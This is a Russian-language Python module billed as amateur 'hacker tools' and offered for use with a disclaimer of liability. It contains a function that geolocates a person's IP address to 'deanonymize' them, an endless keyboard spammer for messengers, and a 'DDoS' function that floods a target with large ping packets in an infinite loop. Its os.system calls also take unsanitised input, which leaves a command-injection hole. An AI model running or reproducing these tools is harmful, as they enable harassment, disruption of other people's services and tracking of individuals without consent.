"""Хакерские инструментики от Флориста))\nРазработчик не несет ответственность за вред, который может быть нанесен использованием данных функций.\nПользуйтесь в рамках законодательства."""
import requests, pyautogui, os, time
from typing import Union

def ip_deanon(ip: str) -> Union[list, str]:
    """Пробейте IP с помощью данной функции.\nВозвращает `list` при удачной завершении операции.\nРазработчик не несет ответственность за предоставленный вред данной функцией."""
    response = requests.get(f"http://ip-api.com/json/{ip}?lang=ru")
    if response.status_code == 404:
        return f'Произошла ошибка 404. Возможно, это проблема с сайтом, которую мы используем для пробива.'
    results = response.json()
    if results['status'] == 'fail':
        return f'Не удалось пробить IP адрес, который был введен в аргумент `ip`.'
    record = []
    for key, value in results.items():
        record.append(f"[{key.title()}]: {value}")
    return record

def spamer(text: Union[str, list], time1: float = 5):
    """Спамер на Python, которого можно юзать в различных мессенджерах.\ntext: текст, которым будет спамить спамер. Или даже список.\ntime: время, через которое начинается исполнение программы после запуска в секундах. По умолчанию, 5 секунд.\nРазработчик не несет ответственность за предоставленный вред данной функцией."""
    if isinstance(text, str):
        time.sleep(time1)
        while True:
            pyautogui.write(text)
            pyautogui.press('enter')
    if isinstance(text, list):
        time.sleep(time1)
        while True:
            for _ in text:
                pyautogui.write(_)
                pyautogui.press('enter')
            print(f'Мы перебрали {str(len(text))} элементов из списка. Повторяем...')

def ddos(ip: str, data: int = 10000):
    """Ддос атака на IP адрес.\nip: айпи адрес, на который нужно обрушить град запросов.\ndata: количество байт, которые мы отправим на IP. По умолчанию, 10000.\nРазработчик не несет ответственность за предоставленный вред данной функцией."""
    while True:
        os.system(f'ping {ip} -t -l {data}')

def from_py_to_exe(file: str):
    """Функция из `.py` в `.exe`.\nfile: название файла, который нужно переконвертировать в `.exe`.\nВнимание! Поддерживается конвертация файлов, которые находятся в одной директории с этим файлом."""
    try:
        os.system(f'pyinstaller {file}')
        return None
    except Exception as e:
        return e